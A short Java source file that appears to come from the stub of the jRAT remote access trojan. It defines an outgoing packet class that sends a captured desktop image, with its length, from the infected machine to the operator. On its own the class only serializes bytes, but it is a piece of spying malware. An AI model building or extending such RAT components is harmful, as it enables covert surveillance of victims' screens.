package pro.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.common.io.StringWriter;


public class Packet68QuickDesktop extends AbstractOutgoingPacket {
	
	private byte[] image;
	
	public Packet68QuickDesktop(byte[] image) {
		this.image = image;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeInt(image.length);
		dos.write(image);		
	}

	@Override
	public byte getPacketId() {
		return 68;
	}

}